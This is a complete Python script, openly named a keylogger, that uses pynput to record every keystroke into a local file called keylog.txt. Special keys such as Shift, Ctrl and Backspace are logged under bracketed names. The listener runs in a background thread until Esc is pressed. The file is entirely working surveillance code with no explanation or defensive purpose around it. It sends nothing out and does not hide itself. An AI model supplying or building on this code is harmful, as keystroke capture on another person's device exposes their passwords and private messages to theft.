from pynput import keyboard
import threading

log_file = "keylog.txt"

# Mapping for special keys
special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.shift: "[Shift]",
    keyboard.Key.shift_r: "[Shift]",
    keyboard.Key.ctrl_l: "[Ctrl]",
    keyboard.Key.ctrl_r: "[Ctrl]",
    keyboard.Key.backspace: "[Backspace]",
    keyboard.Key.esc: "[Esc]",
}

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys with a mapping
        if key in special_keys:
            with open(log_file, "a") as f:
                f.write(special_keys[key])
        else:
            with open(log_file, "a") as f:
                f.write(f"[{key.name.capitalize()}]")  # Log other special keys

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Run the keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

print("Keylogger started. Press 'Esc' to stop.")
